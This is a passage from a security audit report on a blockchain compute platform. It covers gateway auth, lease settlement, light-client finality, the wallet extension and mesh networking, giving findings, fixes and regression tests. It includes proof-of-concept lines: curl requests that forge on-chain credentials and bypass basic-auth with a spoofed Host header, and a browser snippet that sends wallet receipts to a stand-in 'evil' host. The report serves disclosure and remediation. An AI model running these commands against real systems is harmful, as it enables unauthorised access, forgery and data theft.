that can't confine it, and `enforcement_level()` reports `None` off-Linux instead of
over-advertising `OsSandbox`.

### HOLDS (verified)
wasmtime **network** is correctly cap-gated when caps are real (`Deny` default,
loopback `socket_addr_check`); **wasmi** host imports are no-op stubs, fresh store
per instance (DoS-only: no fuel/mem cap); **container** hardened by default
(`cap_drop:ALL`, ro-rootfs, `no-new-privileges`, `net=none`, exact mount match, no
docker-sock/privileged); **firecracker** keeps kernel/rootfs/boot-args
operator-fixed, ro shared rootfs (residual: no jailer, control socket in
world-writable `/tmp`); **native-process-provider** does it right (`env_clear`,
seccomp+landlock in `pre_exec`, refuses on macOS; residual Linux: landlock status
discarded → fail-open, `execve`+unaddressed `connect`/`socket` allowed).

---

## 5. Gateway / web / auth — **CRITICAL GW-4a**

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1 | Bypass Caddy basic-auth → gateway API | **EXPLOITABLE** (Host/SNI confusion) | HIGH |
| 1b | Crack committed basic-auth creds | EXPLOITABLE (conditional) | MED |
| 2 | Unauth machine create/delete/list | **EXPLOITABLE** | HIGH |
| 3a | Portal: publish to another tenant's namespace | **HOLDS** (cap-gated) | — |
| 3b | Portal: traversal / stored XSS | **HOLDS** (in-memory map, no fs, no dynamic innerHTML) | — |
| 4a | Discord `/api/op` custodial-as-any-user | ✅ FIXED (ownership-proof gate) | CRITICAL→HIGH |
| 4b | Discord BYO-LLM key exfil | **HOLDS** (sealed XChaCha20, redacted, fixed endpoints) | — |
| 4c | Discord channel isolation | **HOLDS** (by design) | — |
| 4d | Discord `/admin` authz | **HOLDS** (constant-time token, 404/401) | — |

### GW-4a (CRITICAL→HIGH) — Discord `/api/op` unauthenticated custodial signing — ✅ FIXED
**Fixed** (`discord-bot/src/http_server.rs`, `discord-bot/src/cipherclerk.rs`):
`drive_op` now calls `authorize_op` *before* any turn is built/signed. The caller
must present an ownership proof for the *exact* `user_id` in the body, as
`Authorization: Bearer <token>`: either the **per-user op token**
(`cipherclerk::op_token(bot_secret, user_id)` = `blake3::derive_key`-keyed by the
bot secret, domain-separated from the signing seed so it is NOT the Ed25519 key —
the capability the bot hands a Discord-authenticated user) **or** the operator
`ADMIN_TOKEN` (master override; the operator already holds the bot secret).
Constant-time compare; a missing/wrong token, or a token bound to a *different*
user, is `401`. The gate is always on (the per-user token is always derivable,
so the endpoint is never an open custodial-signing surface even without
`ADMIN_TOKEN`). The legit in-bot flow is unaffected: the desktop drives the bot
**on-chain** (the command cell the reactor watches → `deos_drive::drive`
in-process), never through this HTTP POST. Tests (`http_server::tests`):
`op_refused_without_ownership_proof`, `op_refused_with_wrong_users_token`,
`op_refused_with_garbage_token`, `op_authorized_with_per_user_token_passes_the_gate`,
`op_authorized_with_operator_token`, `op_token_is_per_user_and_deterministic`.
**Residual (defence-in-depth, gateway/deploy lane — not this fix):** scope the
Caddy `/api/*` matcher to the read endpoints so `/api/op` is not proxied publicly
at all. The bot is **live on the edge** → this fix needs a redeploy to take effect.

#### Original finding (for the record)
`POST /api/op` was registered with **no auth** (`discord-bot/src/http_server.rs:264`;
only `/admin` is gated). `deos_drive::drive` (`deos_drive.rs:357-365`) derives the
signing cipherclerk from `bot_secret` + **`req.user_id` from the request body** —
no proof the caller owns that user_id. Any caller signs+submits a real on-chain
turn as any Discord user: `RegisterName` (squat/grief a victim's registry),
`IssueCredential` with attacker-chosen `schema`/`attributes` (forge
`kyc`/`gov_id`/`employment`). Publicly exposed: `Caddyfile:67-69` proxies
`/api/*` on `portal.dregg.studio` (comment claims "public, read-only" — but
`/api/op` is a custodial POST under that prefix), plus `CorsLayer::permissive()`.
```
curl -X POST https://portal.dregg.studio/api/op -H 'content-type: application/json' \
  -d '{"user_id":<victim>,"op":"issue_credential","schema":"gov_id","attributes":{...}}'
```
**Fix:** require auth proving the caller controls `user_id` (or remove the HTTP
custodial path — the code already calls it "RELEGATED"); never proxy `/api/op`
publicly; scope the Caddy `/api/*` matcher to the real read endpoints.

### GW-1 (HIGH) — Caddy basic-auth bypass via Host/SNI
The gateway has **zero app-layer auth**; all auth is delegated to Caddy. The
`*.dregg.works` block reverse-proxies straight to `gateway:8080` with no auth
(`Caddyfile:43-49`). `www.dregg.works` → `site_name_from_host` returns `None`
(`webapp/src/hosting.rs:383`), so it is **not** treated as a static site and falls
through to the fly-machines route table; `default_sni localhost` lets the TLS
handshake succeed by raw IP. `curl -k https://<ip>/v1/apps/demo/machines -H 'Host:
www.dregg.works' -X POST -d '{}'` reaches the machines API past the basic-auth
that protects the operator surface. **Fix:** enforce app-layer auth in the
gateway; make the `*.dregg.works` block serve only the site handler; never let
`www`/non-site hosts reach the machines API.

### GW-2 (HIGH) — unauthenticated machine create/delete/list
`MachinesHandler::dispatch` (`gateway/src/http.rs:92-261`) does **no** auth on any
route; create's only gate is the synthetic lease (always funded, see LEASE-1a).
With `DREGGNET_DISPATCH=tailscale` each unauth create dispatches a real metered
workload to persvati (unauth remote compute + DoS); list enumerates any app's
machines; delete destroys any machine by id with no owner check. **Fix:**
authenticated app-scoped capability on every `/v1/apps/{app}/…` route; bind the
lessee to the authenticated principal, not the URL segment.

### Lesser
- **GW-1b (MED):** `simbi`/`dregg-admin` bcrypt hashes committed in `Caddyfile`
  (cost-14; offline-crackable if weak; rotate + move to secret mount).
- **Ops dashboard (INFO):** app-layer auth is **off by default** (`OPS_ADMIN_TOKEN`
  unset → `config.rs:32,110`); the whole-cloud snapshot + arbitrary `docker logs`
  rely solely on the single committed `dregg-admin` Caddy credential. Set
  `OPS_ADMIN_TOKEN` so defense-in-depth is actually on.

### HOLDS (verified)
Portal publish is cap-gated (`SiteRegistry::publish` checks `cap.authorizes(name)`,
`webapp/src/hosting.rs:312-339`) and has no network publish endpoint (boot-only,
operator-minted cap) → no cross-tenant overwrite; serving is in-memory map lookup
with `normalize_key` → no traversal; portal UI's only `innerHTML` sink is never
called with dynamic data. Discord key-vault seals each BYO key with
XChaCha20-Poly1305 (per-user blake3-keyed, AAD-bound), redacts on Debug, zeroizes,
fixed `&'static str` endpoints (no SSRF), no key logging. Channel isolation is
best-effort by Discord permissions (intentional admin visibility). `/admin` uses a
length-checked constant-time token (404 unconfigured / 401).

---

## 2. Lease / metering / settlement — **CRITICAL LEASE-1a, LEASE-3**

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1a | Free compute via public create (no funding check) | ✅ **FIXED** (verified on-chain funded-lease gate) | CRITICAL |
| 1b | Evade meter: wasmi steps unmetered; charge per-step not per-resource | **EXPLOITABLE** | HIGH |
| 1c | Meter self-reported by backend; no `meter_units ≤ budget` | **EXPLOITABLE** | HIGH |
| 1d | TOCTOU: work runs then settles; settle-fail ⇒ compute consumed | **EXPLOITABLE** | HIGH |
| 2 | Double-spend a lease across backends (no atomic decrement) | **EXPLOITABLE** | HIGH |
| 3 | Replay a settlement (exactly-once in-memory only) | ✅ **FIXED** (durable `(lease,period)` ledger) | CRITICAL |
| 4a | Negative/non-positive/unfunded amounts | **HOLDS** | — |
| 4b | Budget-gate i64 overflow | EXPLOITABLE (marginal) | LOW-MED |

### LEASE-1a (CRITICAL) — free compute on the public create API
`lease_for_create` (`gateway/src/lease.rs:65-71`) builds a `Lease::funded(...)`
with `budget_units` derived from the **attacker's requested guest size**
(`synthetic_budget`, `memory_mb/64`), `funded:true` unconditionally
(`bridge/src/lib.rs:174-189`); the bridge validation gate only checks the bool +
shape, never funding. `POST /v1/apps/x/machines {"config":{"guest":{...
"memory_mb":1048576}}}` → ~16384-period funded lease, zero payment. (Openly
labelled `TODO(real-lease)`, but it is the live public surface.) **Fix:**
`lease_for_create` must read the referenced funded lease cell via the verified
light-client read (`VerifiedNodeLeaseSource`/`dregg_verify`) and reject if the
on-chain reserve doesn't cover the request — never synthesize `funded:true`.
**✅ FIXED** (DreggNet `dev`): the synthesizing `lease_for_create` is gone. The
gateway now holds a `FundingSource` (`gateway/src/funding.rs`) — the chain's
attestation of which leases are funded — and `MachineGateway::create` admits a
machine only against a real funded lease it attests whose on-chain reserve covers
the request's *demand* (`required_budget`); self-asserted funding is never trusted
and a gateway with no funding source fails closed (no machine). Under
`dregg-verify`, `AttestedFunding::from_verified_source` / `NodeFunding` source the
funded leases from the control plane's light-client-VERIFIED on-chain read
(`VerifiedNodeLeaseSource`). Proven (`gateway/tests/no_free_compute.rs`): a
fabricated over-reserve guest is refused, an unfunded app is refused, an empty
verified chain funds nothing, and only a covered request is admitted (against the
REAL reserve, not the request).

### LEASE-3 (CRITICAL) — replay a settlement
Dedup key `(lease_id, period)` is persisted **nowhere durable** — both backends
keep it in an in-memory `Mutex<HashMap>` (`durable/src/settle.rs:196-199`;
`control/src/node_api.rs:572`). The on-chain memo `dreggnet-settle:<lease>:<period>`
is only "auditable" — `submit_transfer` POSTs a plain `Effect::Transfer`
(`node_api.rs:223-248`) and **nothing checks for a prior transfer with that memo**.
Restart the settler (or run a second instance) → `settled` is empty → re-settle
every `(lease,period)` → **duplicate real on-chain Transfers**, double-charging the
lessee. (The pg meter outbox is idempotent, but `settle_meter_outbox` feeds it into
the in-memory sink, so settlement is still replayable across restart.) **Fix:**
persist the dedup (unique constraint in the meter DB) and/or enforce memo-uniqueness
in the kernel so a replayed settlement turn is rejected, not just "auditable."
**✅ FIXED** (DreggNet `dev`, the real on-chain rail): `NodeApiSettlement` now
carries a durable `DurableSettleLedger` (`control/src/settle_ledger.rs`) — each
`(lease,period)` is reserved **write-ahead** (persisted+fsync'd) BEFORE the
`Transfer` is submitted, and a key already present (this process OR a prior
process's on-disk ledger) is replayed without submitting a second transfer. So the
on-chain submission is **at-most-once per key across any restart**: a restarted /
second settler loads the ledger and refuses to re-charge. The `dreggnet-provider`
real loop attaches the ledger by default (`DREGGNET_SETTLE_LEDGER`). Proven
(`control/tests/settlement_durable.rs`): a settler restart re-settling the same
`(lease,period)` submits **no** second Transfer (counted at the node), while a new
period still settles. (The pg unique constraint remains the strongest
cross-live-instance form; this is the dependency-light restart-safe ledger.)

### LEASE-1b/1c/1d/2 (HIGH)
- **1b:** charge is fixed `cost_per_step` (`durable/src/lib.rs:595-612`), decoupled
  from real consumption; wasmi has no fuel meter (`exec/src/lib.rs:398-402`) → one
  metered unit buys a full wall-clock budget of unbounded CPU.
- **1c:** `DurableOutput.meter_units` is parsed straight from the backend's HTTP
  JSON with no verification (`control/src/mesh.rs:663-669`) and settled verbatim
  (`orchestrator.rs:408-443`); **no `meter_units ≤ budget` check** → a compromised
  or on-path backend (plaintext HTTP) sets the bill arbitrarily.
- **1d:** `process_lease` runs the workload then settles (`orchestrator.rs:334-343`);
  settle-fail ⇒ `SettleFailed` but compute already ran. No "reserve before run."
- **2:** the meter is per-workflow-instance (`durable/src/lib.rs:255-260`), instance
  id is stable per lease cell (`node_api.rs:458`), dedup is process-local
  (`node_api.rs:357`); two orchestrators / a restart each run a full budget for one
  funded lease → compute delivered N times.
**Fix:** single authoritative balance with atomic reserve→decrement before
dispatch; control plane independently bounds/recomputes the charge (`min(reported,
budget)`), ultimately from a signed/attested receipt; global/persistent instance
dedup.

### HOLDS / lesser
Non-positive/unfunded/negative-budget rejected (`settle.rs:235`,
`bridge/src/lib.rs:193-194,266-277`); same-key-different-terms is a `Conflict` not
overwrite; `InsufficientFunds` guards the in-process ledger. **LEASE-4b (LOW-MED):**
`total + cost_per_step` and `steps * per` use unchecked i64 over attacker-influenced
lease fields (`durable/src/lib.rs:595`, `orchestrator.rs:416`) → wrap-to-unbilled
(release) / panic (debug). **Honest caveat:** 1a/1c and the node-API trust in 2/3
partly reflect the deliberately-stubbed "real funded lease" wire that's off by
default; they collapse once the verified on-chain lease read + kernel-enforced
settlement idempotency are wired (the code names this as next).

---

## 7. Light-client / consensus — **HIGH F1, LC-1, LC-2**

### Verdict table
| # | Goal | Verdict | Severity |
|---|---|---|---|
| 1 | Fool the light client | EXPLOITABLE on wired consumers; HOLDS for VK/aggregate core | HIGH |
| 1a | VK substitution | **HOLDS** (`lightclient/src/lib.rs:186-201`, `VkFingerprintMismatch`) | — |
| 1b | Forge/drop/reorder a turn in the aggregate | **HOLDS** (3 tamper teeth) | — |
| 2 | Forge finality / equivocate | **EXPLOITABLE** (F1, LC-2, F2) | HIGH |
| 2a | BLS rogue-key / DKG / VRF | **HOLDS** | — |
| 3 | Corrupt store on recovery | **EXPLOITABLE** (NODE-1 tamper, NODE-2 rollback) | HIGH |
| 3a | Recovery order soundness | **HOLDS** (`node/src/main.rs:1496-1513`) | — |
| 4 | Weaponize Rust↔Lean divergence | **EXPLOITABLE** (F1 is exactly a Lean-assumption the Rust violates) | HIGH |

### F1 (✅ FIXED) — duplicate-vote quorum forgery
**Fixed:** both `is_valid_with_keys` and `verify_with_keys`
(`federation/src/types.rs`) now track a `HashSet<usize>` of voter ids and
reject the QC the moment a `voter_id` repeats, so only DISTINCT valid voters
count toward the threshold. Tests in `types.rs::qc_dedup_tests`:
`duplicate_voter_qc_is_rejected` (the `[(0,sig0),(0,sig0),(0,sig0)]` forgery is
now rejected), `padded_duplicate_does_not_reach_threshold`, and
`genuine_distinct_voter_qc_is_accepted` (an N-distinct-voter QC still verifies).
Original report below.

`QuorumCertificate::is_valid_with_keys`/`verify_with_keys`
(`federation/src/types.rs:209-224,270-286`, lead-verified) check
`votes.len() >= threshold` and verify each `(voter_id, sig)` but **never dedup
`voter_id`**. The signed message is identical for every vote on a block, so
`votes = [(0,sig0),(0,sig0),(0,sig0)]` with `threshold=3` returns `true` — **one**
committee key forges a full quorum cert / checkpoint / light-client proof / epoch
transition, defeating BFT. `node.rs::collect_vote` dedups when *building* a QC, so
honest QCs are clean — only *verification* accepts forgeries. This is precisely the
Rust↔Lean weaponization: `bls_quorum_diff`'s `quorum_has_honest_signer`/
`no_equivocating_qcs` *assume* the verifier rejects duplicate signers, and the diff
is `#[cfg(test)]` so it never exercises this legacy Ed25519 verifier. (The BLS
`verify_with_committee` aggregate path is sound.) **Fix:** require distinct
`voter_id`s; count distinct voters against threshold. The single most urgent,
dependency-free fix in this pass.

### LC-1 (HIGH, live) — wired web-surface content gate is count-only, no crypto — ✅ FIXED
> **STATUS: FIXED** (`starbridge-web-surface/src/web_of_cells.rs`). The web-of-cells
> now produces GENUINE Ed25519 quorum signatures: `WebOfCells` holds committee SIGNING
> keys and `attest()` signs the canonical `AttestedRoot::signing_message()`, so the
> committee public keys (`WebOfCells::committee()`) are a real anchor. A new
> `AttestedResource::verify_anchored(committee)` is the acceptance gate — it gates on
> the cryptographic `attested_root.is_valid(committee)` (every counted signature must
> verify under a key IN the committee), refuses an empty/unanchored committee, and
> refuses a BLS-QC-only root on this path (so the LC-5 structural-QC shortcut cannot
> bypass it). The keyless `verify()` is hardened too: a degenerate `threshold:0` /
> empty-signature "quorum" (which the bare `has_quorum()` count accepted) is now
> refused with `NoQuorum`. Regression-pinned by
> `committee_anchored_verify_accepts_genuine_and_refuses_forgeries`: a genuine fetch
> verifies against the real committee; a `threshold:0` root and a root signed by
> attacker keys are both refused (`NoQuorum` / `Unattested`); an unanchored client and
> a foreign committee accept nothing. The 10-test web-surface suite stays green.
> Original finding below.

`starbridge-web-surface/src/web_of_cells.rs:131-151` ("run before a byte reaches
the renderer", called from `rehydrate.rs:592`, transclusion, game, world) gates only
on `attested_root.has_quorum()`, which (`types/src/lib.rs:463-469`) is **count-only**
— `quorum_signatures.len() >= threshold` (no sig verified, no signer checked) or a
`ThresholdQC` of `len >= 48`. The crate holds no committee anchor and never calls
`is_valid(known_keys)`. A malicious content server fabricates an `AttestedResource`
(self-consistent) + an `AttestedRoot` with `threshold:0` (confirmed
`threshold_zero_root_has_quorum`) → renderer paints attacker bytes as attested. The
node-side gossip *does* anchor (`federation/src/node.rs:1325`,
`federation.rs:295` call `is_valid(&members)`); the gap is the light/web consumer.
**Fix:** the client must hold the committee keys and gate on `is_valid(known_keys)`;
`has_quorum` must never be an acceptance gate.

### LC-2 (HIGH, CRIT-by-design; demo/test reachable today) — no trusted validator set — ✅ FIXED
> **STATUS: FIXED** (`lightclient/src/lib.rs`). `verify_finalized_history` now takes a
> `committee: &[[u8; 32]]` — the client's TRUSTED validator set (genesis/epoch-
> distributed, like the VK anchor, NEVER read from the cert). Leg 3 gates on the new
> `FinalityCert::has_committee_quorum(committee)` / `distinct_committee_signers`, which
> count a vote ONLY when its key is a member of the trusted committee AND its Ed25519
> signature verifies — and take the threshold over `committee.len()`, not the
> cert-supplied `participant_count`. An empty committee is refused outright
> (`UnanchoredCommittee`). This closes the equivocating-prover fork: a prover that mints
> fresh keypairs and signs `finality_signing_message(fork_root, n)` no longer finalizes,
> because its forged keys are not in the committee. The count-only `has_quorum()` is kept
> only as a labelled diagnostic ("never an acceptance gate"). Teeth:
> `finalized_light_client_rejects_fork_by_foreign_committee` (the equivocating fork by
> foreign keys is `NoQuorum`-refused; the genuine committee still finalizes),
> `finalized_light_client_refuses_when_unanchored`, and the fold-free
> `committee_anchored_quorum_counts_only_trusted_keys` (foreign keys count 0, a shrunk
> `participant_count` cannot lower the committee-anchored bar). Original finding below.

`verify_finalized_history` (`lightclient/src/lib.rs:469-512`) accepts leg-3 when
`cert.has_quorum()` = `distinct_signers() >= supermajority_threshold(participant_count)`
— validator keys are **whatever the cert carries** and `participant_count` is
**attacker-supplied**; no committee param, no genesis/epoch anchoring. An
equivocating prover honestly executes a fork (same window shape ⇒ same VK
fingerprint, so the aggregate genuinely verifies), mints 3 fresh keypairs, signs
`finality_signing_message(fork_root, 4)`, sets `participant_count=4` → the client
accepts the fork as finalized. The Lean `CertValid`
(`FinalizedLightClient.lean:104`) is far stronger (anchored round-robin leader +
`isSuperRatified`). Only called from demos/tests today, so not a live exploit yet,
but it is the published "FINALIZED LIGHT-CLIENT CHECK" and its leg-3 is unsound.
**Fix:** pass the trusted committee; count only signers in that set.

### NODE-1 / NODE-2 (HIGH, live) — corrupt store on recovery — ✅ FIXED
> **STATUS: FIXED** (`node/src/state.rs`, `persist/src/commit_log.rs`). After the
> existing crash-consistency convergence passes, `verify_recovery_convergence` now runs
> `verify_signed_anchor_and_rollback`:
> - **NODE-1 (signed anchor):** it loads the latest federation `AttestedRoot` and
>   verifies its quorum signature against the loaded committee keys
>   (`StoredAttestedRoot::verify_signatures(known_federation_keys)`). The attested
>   root's `merkle_root` IS the `canonical_ledger_root` at finalization
>   (`blocklace_sync.rs:4332`), so when the recovered head sits at the attested height
>   the recovered root MUST equal the SIGNED root. A same-epoch attested root whose
>   quorum signature does NOT verify (a forged/unsigned finalization an offline attacker
>   fabricated) makes the node REFUSE to start — an attacker without committee keys
>   cannot forge a valid signature over their tampered state. (Foreign-epoch and
>   BLS-QC roots are skipped to avoid false-refusal, with a warning.)
> - **NODE-2 (anti-rollback):** a monotonic high-water mark (`recovered_head_height` +
>   the verified signed height) is persisted and checked on boot; a recovered head
>   BELOW the witnessed floor is refused (no reverting finalized spends / resurrecting
>   spent nullifiers). The signed-height component is the unforgeable part; the
>   persisted mark is a best-effort within-window backstop.
> Teeth: `node1_forged_attested_root_refuses_to_start`,
> `node2_rollback_below_high_water_refuses_to_start`,
> `node2_high_water_allows_equal_or_higher_head_and_advances` (non-vacuous: a normal
> restart at an equal head is NOT flagged); the existing `convergence_*` /
> `sub_checkpoint_*` recovery tests stay green. Original finding below.

- **NODE-1:** `verify_recovery_convergence` (`node/src/state.rs:1096-1139`) reduces
  to `canonical_ledger_root(ledger) == store.recovered_ledger_root()` — fail-closed
  on mismatch, but the "expected" root is a plain unsigned `[u8;32]`
  (`persist/src/commit_log.rs:461-467,108`) stored in the *same tamperable redb*,
  and `canonical_ledger_root` is an **unkeyed** BLAKE3 with a public domain-sep. With
  offline write access: edit a cell + mirrored index, recompute the public root,
  overwrite `CommitRecord.ledger_root` → the gate passes, tampered ledger served as
  authoritative. It is crash-consistency wearing an integrity label.
- **NODE-2:** no anti-rollback / height monotonicity on boot (`recover_to_last_consistent`
  is wired only into `starbridge-v2`, not the node) → swap an older internally-
  consistent snapshot ⇒ revert finalized spends/burns, resurrect consumed nullifiers.
**Fix:** anchor "expected" to the federation-signed attested root (verify a quorum
sig over `(height, ledger_root)` with the committee keys already loaded); persist a
signed monotonic high-water mark and refuse a store below it.

### Lesser consensus findings
- **LC-3 (MED-HIGH, live):** the production-wired wasm light client
  (`wasm/src/bindings_lightclient.rs:155-200`) checks legs 1+2 only — **no finality
  gate** → returns `attested:true` for a finalized chain *and* an equivocating
  prover's internally-valid fork. Wire `verify_finalized_history` (after LC-2's fix).
  **✅ FIXED** (`wasm/src/bindings_lightclient.rs`): a new
  `verify_finalized_devnet_history(envelope, config_anchor_hex, committee_hex_csv)`
  entry runs the over-wire legs 1+2 (the existing byte verify) AND the third leg —
  the COMMITTEE-ANCHORED finality check (`finality_leg`): the envelope's finality cert
  must finalize the proven head root with a supermajority of the client's CONFIG
  committee (a separate argument, never read from the artifact), reconstructed into a
  `dregg_lightclient::FinalityCert` and gated on `has_committee_quorum`. A cert-less
  envelope (legs-1+2-only), a seam break, an empty committee, or a fork signed by
  foreign keys all yield `attested:false` with a precise reason — no finalized
  attestation is laundered. Host tooth `finality_leg_anchors_to_the_trusted_committee`
  (`wasm/src/bindings_lightclient.rs`) pins the pure leg: unanchored (empty committee)
  accepts nothing, a fork by foreign keys is sub-quorum, a root-seam break is refused,
  and only a genuine committee quorum over the proven head passes — the same
  `dregg_lightclient::has_committee_quorum` code the native LC-2 teeth fold end-to-end.
- **F2 (HIGH, crate boundary):** admission bonds are self-asserted
  (`sign(domain‖owner‖amount)`, no escrow, `admission.rs:114-141,232-250`) →
  `Bond::post(sk, u64::MAX)` admits a free Sybil; slashing only `retain`s the
  struct. Bind `amount` to a verified locked-cell commitment.
- **LC-4 (MED):** the cert↔aggregate finality seam compares only lane-0
  (`final_root[0]`, ~31-bit, `lightclient/src/lib.rs:485,281`) — a genuine cert for
  root R can pair with a genuine aggregate of a different history colliding on
  lane-0 (~2^15.5, the codebase's own 31-bit scar). Sign/compare the full 8-felt
  anchor.
- **LC-5 (MED):** `AttestedRoot::is_valid` returns `true` for any `threshold_qc`
  with `len >= 48` regardless of `known_keys` (`types/src/lib.rs:499-504`).
- **F3/F4/F5 (MED, constructors):** threshold-decrypt is trusted-dealer with the
  published key == the raw symmetric key + non-constant-time MAC
  (`threshold_decrypt.rs:43-44,293`); no QC-vote-equivocation slashing atom (only
  block-equivocation, `court.rs`); `FederationCommittee::new`/`BeaconCommittee::deal`
  use transient toxic waste (prefer `new_with_eth_setup`/`dkg.rs`).

### HOLDS (verified)
The aggregate IVC core: VK pinned from config not the artifact (`VkFingerprintMismatch`),
spliced public root refused (`ClaimedPublicsUnattested`), forged/dropped/reordered
turns refused by leaf+temporal teeth (`lib.rs:1101-1208`) — matches the Lean
hypotheses; standing floor is FRI/STARK soundness (a standard crypto carrier).
BLS rogue-key has no on-wire registration; the hinTS hint binds pk↔sk (PoP-equiv);
DKG is real joint-Feldman (shares checked, QUAL disqualifies, aborts `|QUAL|<t`);
VRF is faithful RFC 9381. Recovery *order* is sound
(`reseed_genesis_then_overlay`, genesis baseline then overlay LWW — closes the old
double-credit bug); it is only as strong as NODE-1's anchor. `FinalityCert`
*does* dedup signers (`lib.rs:342`) — the complementary surface to F1's hole.

---

## 8. Wallet (extension / cipherclerk) — mostly HOLDS

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1 | Key / seed exfil | **HOLDS** | — |
| 2 | Blind-sign / confirmation bypass | **HOLDS** (1 LOW residual) | LOW |
| 3 | Origin / message auth | MOSTLY HOLDS — one leak | **MEDIUM** |
| 4 | Data-loss footgun ("now fixed") | MOSTLY FIXED — recovery overwrite isn't | LOW-MED |

The two CRITICAL classes hold. **Keys never leave the background** (`window.dregg`
exposes no key read, `page.ts:413-417`; secret reads require `isExtensionPopup`,
`background.ts:3108-3124`; no `externally_connectable`/`onMessageExternal`; the
content bridge stamps the true `_origin` after the page detail so it can't be
spoofed, `content.ts:119-122`). **Encryption is real** (PBKDF2-SHA256 600k →
AES-256-GCM; wiped on lock; no secret logged). **Every signature is gated** by a
turn-hash-bound confirmation rendered from the same wasm `sign_turn_v3` output
(`background.ts:2755-2798`), unknown effects flagged (`explain.ts`), separate
focused OS window + `frame-ancestors 'none'` (clickjack-blocked), no auto-sign.

### WALLET-3 (MEDIUM) — cross-origin activity-stream leak
`dregg:subscribe` is in `UNRESTRICTED_METHODS` (`content.ts:12-21`), so any website
can `window.dregg.on('receipt'|'activity'|'intent', cb)`; `notifySubscribers`
(`background.ts:547-555`) broadcasts the user's own receipts/activity/intents to
**every** subscribed tab with **no origin check**. (`dregg:getActivityFeed` is
*not* page-allowlisted, yet the same object ships via `.on('activity')` —
inconsistent gating, contradicts PRIVACY.md.) PoC: any page
`window.dregg.on('receipt', r => fetch('https://evil/x?d='+btoa(JSON.stringify(r))))`.
**Fix:** move `dregg:subscribe` behind per-origin approval; don't deliver
`receipt`/`activity` to unapproved origins.

### WALLET-4 (LOW-MED) — recovery overwrite has no guard
`recoverFromMnemonic` (`background.ts:1350-1396`) has **no** `walletExists()` check
(unlike onboarding, which now guards correctly) — it unconditionally overwrites
`MNEMONIC_KEY` + the encrypted envelope, with no UI warning (`recovery.js:112-174`);
running Recover over a still-funded wallet silently loses the prior on-device key.
**Fix:** add the `walletExists()` gate + replace-confirmation, symmetric with
onboarding. (Onboarding data-loss is genuinely fixed: `beginOnboarding`/`complete`
refuse when `walletExists()`; no `storage.clear()`/factory-reset path exists.)
**LOW:** disclosure "remember" is keyed by origin only, not action/resource.

---

## 6. Mesh — HIGH MESH-2, MED MESH-1

### Verdict table
| # | Attack | Verdict | Severity |
|---|--------|---------|----------|
| 1 | Join tailnet via forged/replayed preauth key | PARTIAL / EXPLOITABLE-ON-LEAK | MEDIUM |
| 2 | Reach node `:8420`/`:9420` you shouldn't | **EXPLOITABLE** | HIGH |
| 3 | ACL gaps (flat any→any) | MOSTLY HOLDS (role-tagged) | MEDIUM |

### MESH-2 (HIGH) — node ports on 0.0.0.0 with unauthenticated reads
`deploy/staging/docker-compose.yml:243-248` runs the node `--bind 0.0.0.0` and
host-publishes `8420:8420` + `9420:9420` (docker `ports:` inserts DOCKER iptables
rules that **bypass a host ufw**). Every *other* service was scoped — headscale's
control port is `127.0.0.1:8080:8080`, gateway/ops/bot are `expose:`-only — so the
node is the slip; it doesn't need host publication (the edge reaches it at
`127.0.0.1:8420`). The read API is **unauthenticated** — the bearer is attached
only on POST (`control/src/node_api.rs:286-288`); `/api/cells`, `/api/cell/{id}`,
`/api/receipts/index/*`, `/checkpoint/latest` are plain GETs. Anyone reaching
`:8420` (VPC peer, co-located container, or the internet if the SG allows / docker
punches through) dumps every cell+balance, nonce, the full receipt log + MMR root;
`:9420` gossip is likewise exposed. (Submit is bearer-gated, so this is read +
gossip exposure, not direct turn forgery — but a defense-in-depth collapse one SG
rule from full exposure.) **Fix:** scope to `127.0.0.1:8420:8420` / the overlay (or
drop `ports:` for `expose:`); require the bearer (or tailnet identity) on reads;
explicit SG deny on `8420/9420`.

### MESH-1 (MED) — reusable, long-lived preauth keys
Keys are minted **reusable, 30-day, tagged**
(`deploy/ARCHITECTURE-COMPUTE-BACKEND.md:149-153`,
`headscale preauthkeys create --reusable --expiration 720h`). A reusable key is a
bearer credential: one leak (the docs themselves say "ask ember / generate fresh")
lets an attacker `tailscale up --authkey=K` arbitrary nodes **repeatedly** for 30
days, each inheriting the key's tag. **Fix:** ephemeral + single-use keys
(`--ephemeral`, drop `--reusable`), short expiry, one per node, expire after join;
prefer interactive `headscale nodes register` for standing members. (No key
material is committed — verified; placeholders only.)

### HOLDS / lesser
The tailnet ACL is **not** flat — it is role-tagged least-privilege
(`deploy/staging/headscale/acls.hujson`: admin→`*:*`, `tag:edge`→`tag:compute`
limited ports, `tag:compute`→`tag:edge` limited, `tagOwners` restricts assignment),
headscale has `verify_clients:true`. **MESH-3 (MED, latent):**
`tag:compute → tag:edge:5432` + default `dreggnet/dreggnet` Postgres creds
(`.env.example:5-7`) — pg is compose-internal today, so latent. **MESH-0 (INFO):**
the vendored `net/httpe/.../tailscale_auth.rs` whois middleware is **not wired into
any DreggNet service** — nothing authenticates by tailnet identity; everything
rides bearer + ACL + port scoping (which MESH-2 undercuts).

---

## Prioritized fix list

1. **CAP-1 (CRITICAL)** — ✅ FIXED: `determine_required_permissions` is now an
   exhaustive (closed, no `_ =>`) match mapping `SetProgram`/`MakeSovereign` → the
   `SetVerificationKey` floor and `CellSeal`/`CellUnseal`/`CellDestroy` → the
   `SetPermissions` floor, so `Authorization::Unchecked` can no longer overwrite or
   destroy a victim cell. Lean-aligned (`Dregg2.Exec.EffectsAuthority`/`EffectsState`);
   regression-pinned by `cap1_authority_tests`. (Defense-in-depth follow-up: also
   enforce the held cap's level + `allowed_effects` facet on the direct cross-cell
   path the way `ExerciseViaCapability` does — separate from the closed Unchecked hole.)
2. **SBX-1/2/3 (CRITICAL)** — ✅ SUPERSEDED by the owned-compute rewrite: the
   vulnerable wasmtime/native/firecracker providers lived in the now-**removed** compute
   submodule and are gone. Compute is owned and in-crate; the only tier that executes
   guest code is the owned `wasmi` Sandboxed tier (no-op host imports, fresh store per
   instance — provider `dreggnet-wasmi`). Every stronger tier (JIT/`Caged`/`MicroVm`/
   native/python/node) is a fail-closed seam (`TierNotServed`/`NotWired`) that runs no
   guest code, so the escape surface these findings described no longer exists. Wiring an
   owned engine per stronger tier is future work; the seam is the safe default until then.
3. **GW-4a (CRITICAL→HIGH)** — ✅ FIXED: `/api/op` now requires a per-user
   ownership-proof token (or the operator token); an unproven `user_id` is `401`.
   Residual (gateway lane): scope the Caddy `/api/*` matcher so `/api/op` is not
